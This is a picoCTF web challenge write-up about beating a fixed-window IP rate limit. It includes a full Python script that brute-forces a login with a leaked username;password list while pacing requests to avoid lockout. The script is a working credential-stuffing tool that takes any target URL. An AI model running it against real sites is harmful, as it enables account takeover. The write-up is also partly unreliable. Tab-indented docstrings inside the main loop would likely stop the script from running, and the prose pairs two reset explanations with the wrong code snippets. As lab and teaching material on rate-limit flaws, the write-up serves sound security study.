---
title: Fool the Lockout
platform: picoCTF
category: Web
difficulty: Medium
tags:
  - ratelimiting
  - bruteforce
---
# Fool the Lockout

> **Category:** Web | **difficulty** : Medium | **platform** : PicoCTF

**Problem:** The challenge is a login web page with faulty rate-limiting logic. We're given a leaked `username;password` list and expected to brute-force the login while bypassing the rate limit.

**Solution in one line:** Stay just under the server's max-requests-per-epoch threshold by pacing requests evenly within each window, so the lockout condition is never triggered.

**Concepts:** `rate-limit bypassing` `brute-forcing` `python scripting`

---

## The vulnerability / concept

**Problem Statement**

The Problem is described as such:

"Your friend is building a simple website with a login page.

To stop brute forcing and credential stuffing, they’ve added an IP-based rate limit: exceed the attempt threshold and your IP is blocked for a while. They’re convinced this makes guessing credentials impossible.

To test their defense, they’ve:
- Created a dummy account with a random username–password pair from public credential lists.
- Given you those username and password lists.
- Shared the full source code."

So the objective is to look at the source code provided in a zip file and find the flaw in the code-base. We're also given a credential list and told that rate-limiting is implemented, so the expectation is to brute-force the login endpoint without ever triggering the lockout.

The code-base has flawed rate-limiting logic: it allows up to a set maximum number of requests within a fixed epoch (time window). Going over that limit within the window results in an IP lockout.

**Flaws:**
**The actual flaw** is the fixed-window rate-limiting design: it resets on a wall-clock boundary rather than tracking a rolling window, so pacing requests just under the threshold sidesteps it entirely.

Two things worked in the solver’s favor on top of that:

- The credential list was short enough to exhaust well inside the request budget the rate limit allowed. There is no need to get clever with timing precision or optimize the script beyond simple pacing.
- The failed-attempt threshold itself was generous, which left a wide margin of error. Even imprecise timing wouldn’t have risked tripping a lockout.

**Where it shows up in real life:**
This type of flaw frequently shows up when developers roll their own rate-limiting logic instead of relying on industry-standard implementations like those built into Nginx, AWS WAF, or Cloudflare. A fixed-window scheme lets an attacker send a burst of requests right before a window closes and another burst right after it reopens — effectively doubling the allowed request rate in a very small span of time.

---

## Walkthrough
First of all Download the provided files, `app.py` and `creds-dump.txt`. `creds-dump.txt` holds username;password pairs, so it needs to be parsed before use.

In `app.py`, three variables immediately stand out as the core of the rate-limiting logic:

```
MAX_REQUESTS = 10      # max failed attempts before a user is locked out
EPOCH_DURATION = 30     # timeframe for failed attempts (in seconds)
LOCKOUT_DURATION = 120      # duration a user will be locked out for (in seconds)
```

To understand the problem fully, we look at the rest of the code. Most of it is helper functions and utilities, with a few acting as the interface to the login route. Here, `request_rates` is a JSON object that tracks requests per sender IP. Two functions stand out as the actual rate-limiting logic: `refresh_request_rates_db` and `exceeded_rate_limit`.

Now unto a bit of a theory part, `refresh_request_rates_db` function refreshes the database before and after a request is counted. If an IP in `request_rates` is currently locked out and the lockout period has elapsed, it resets the counter.
``` py
if curr_time - epoch_start_time > EPOCH_DURATION:
        request_rates[client_ip]["num_requests"] = 0
```
It also resets the counter once the epoch window has rolled over.

```py
if (lockout_end != -1) and time.time() >= lockout_end:
        request_rates[client_ip]["lockout_until"] = -1

```

Function `refresh_request_rates_db` is called inside `exceeded_rate_limit` function to update the record for the requesting IP. If the IP isn't yet in `request_rates`, it's added with a request counter of 0. Each new request from that IP increments the counter as `request_rates[client_ip]['num_requests'] += 1`, and once the counter hits the limit, it triggers a lockout for `LOCKOUT_DURATION`, i.e. `request_rates[client_ip]['lockout_until'] = curr_time + LOCKOUT_DURATION`. 

## Solution
With the logic mapped out, the objective becomes writing a script that brute-forces the login while staying under this rate limit.

Complete script for the solution is posted below this section. The script works through the leaked credential list one pair at a time, but it paces itself so it never crosses the server’s 10-requests-per-30-second threshold. It picks a safe budget of 9 requests per epoch and spreads them evenly across the 30 seconds (`spacing = EPOCH_DURATION / MAX_REQUESTS`), adding a safety margin of a single request, instead of firing them all at once. Before every attempt it checks whether it’s still inside an active lockout or whether the current epoch has expired, and resets its internal counters accordingly, mirroring the same window logic the server itself uses.

---
## Code
```py
#!/usr/bin/env python3
import argparse
import sys
import time

import requests


def load_credentials(path):
    """Parse 'username;password' pairs from a file, one per line."""
    creds = []
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or ";" not in line:
                continue
            user, pwd = line.split(";", 1)
            creds.append((user.strip(), pwd.strip()))
    return creds


def classify(resp):
    """Sort a login response into one outcome bucket."""
    text = resp.text or ""

    if "Rate Limited Exceeded" in text:
        return "RATE_LIMITED"
    if "Invalid username or password" in text:
        return "INVALID"

    if resp.history and any(
        r.status_code in (301, 302, 303, 307, 308) for r in resp.history
    ):
        return "SUCCESS_REDIRECT"

    if "flag" in text.lower():
        return "SUCCESS_INDEX"

    return f"UNKNOWN(status={resp.status_code})"


def attempt_login(session, url, username, password, timeout, max_retries):
    """POST one credential pair, retrying transient network errors.

    Returns (classification, response_or_None). A result of "ERROR" means
    every retry was exhausted -- the caller decides whether to keep going.
    """
    last_exc = None
    for attempt in range(1, max_retries + 2):  # +1 initial try, +1 for range
        try:
            resp = session.post(
                url,
                data={"username": username, "password": password},
                allow_redirects=True,
                timeout=timeout,
            )
            return classify(resp), resp
        except requests.RequestException as e:
            last_exc = e
            if attempt <= max_retries:
                print(f"    [RETRY {attempt}/{max_retries}] {e}")
                time.sleep(1.5 * attempt)  # small backoff between retries
    print(f"    [ERROR] giving up after {max_retries} retries: {last_exc}")
    return "ERROR", None


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="Login endpoint URL")
    parser.add_argument("--creds", required=True, help="Path to 'user;pass' credential file")
    parser.add_argument("--max-requests", type=int, default=9,
                         help="Requests per epoch (stay under the server's real limit)")
    parser.add_argument("--epoch", type=float, default=30.0, help="Server epoch duration (s)")
    parser.add_argument("--lockout", type=float, default=120.0, help="Server lockout duration (s)")
    parser.add_argument("--timeout", type=float, default=15.0, help="Per-request timeout (s)")
    parser.add_argument("--max-retries", type=int, default=2,
                         help="Retries for a single credential pair on network error")
    args = parser.parse_args()

    creds = load_credentials(args.creds)
    print(f"Loaded {len(creds)} creds | MAX_REQUESTS={args.max_requests} "
          f"EPOCH={args.epoch}s LOCKOUT={args.lockout}s")

    session = requests.Session()
    spacing = args.epoch / args.max_requests
    lockout_until = 0.0
    requests_this_epoch = 0
    epoch_start = None

    for i, (username, password) in enumerate(creds, start=1):
        now = time.time()

		""" trigger lockout if lockout_until is set """
        if now < lockout_until:
            wait = lockout_until - now
            print(f"[LOCKOUT] Sleeping {wait:.1f}s")
            time.sleep(wait)
            requests_this_epoch = 0
            epoch_start = None
            lockout_until = 0.0

		""" reset the epoch if window exceeds the epoch variable """
        if epoch_start is not None and (time.time() - epoch_start) >= args.epoch:
            requests_this_epoch = 0
            epoch_start = None

        if epoch_start is None:
            epoch_start = time.time()
            requests_this_epoch = 0

        if requests_this_epoch > 0:
            delay = (epoch_start + requests_this_epoch * spacing) - time.time()
            if delay > 0:
                time.sleep(delay)

        print(f"[{i}/{len(creds)}] Trying '{username}:{password}' ...", flush=True)
        result, resp = attempt_login(
            session, args.url, username, password, args.timeout, args.max_retries
        )

        if result == "RATE_LIMITED":
            print(f"[RATE LIMITED] Locking out for {args.lockout}s")
            lockout_until = time.time() + args.lockout
        elif result == "INVALID":
            print("    [FAIL] Invalid credentials")
        elif result in ("SUCCESS_REDIRECT", "SUCCESS_INDEX"):
            print(f"[SUCCESS] Logged in as '{username}:{password}' ({result})")
            print("Done -- stopping, correct credential found.")
            return 0
        elif result == "ERROR":
            print("    [SKIP] moving on after exhausting retries")
        else:
            print(f"    [{result}] Unexpected response")

        requests_this_epoch += 1

    print("Done -- exhausted credential list without a success.")
    return 1


if __name__ == "__main__":
    sys.exit(main())

```

After each login attempt, `classify()` reads the response and sorts it into one of a few buckets: rate-limited, invalid credentials, a successful redirect, or something unexpected, so the script knows whether to back off, keep going, or stop. Redirect success is detected by checking `resp.history` and once `requests` follows a redirect automatically, the status code you see is always the destination page’s, not the redirect’s, so `resp.history` is where that evidence actually survives. If the server does rate-limit it anyway, the script sleeps until the lockout ends and resumes from where it left off rather than crashing or hammering the server further. A transient network error on a single attempt (timeout, dropped connection) is retried a bounded number of times before moving on, so a momentary hiccup doesn’t cause the script to silently skip past the correct credential.

As soon as a success is detected, the script stops immediately and prints the matching username and password, which is then used to log in and retrieve the flag.

The success check matches on the word `flag` anywhere in the response text which is a loose check, fine for this challenge’s known response shape, but it would need a more specific marker (page title, a known element) against an arbitrary target.

---
Unlike usual CTFs, just remaining under the rate limit for solving the problem was enough because the password list was small, and the rate-limit allowed much generous rate of request. There could definitely be some other clever edge cases for this problem, which would also work for more realistic situations involving longer list of credential and stricter rate-limiting. 
I personally took this CTF as topic to learn the code base and write scripts accordingly rather than using the edge-cases to break past the authentication. Using Sliding window or modified sliding window or persistent counter would make the solution more complicated.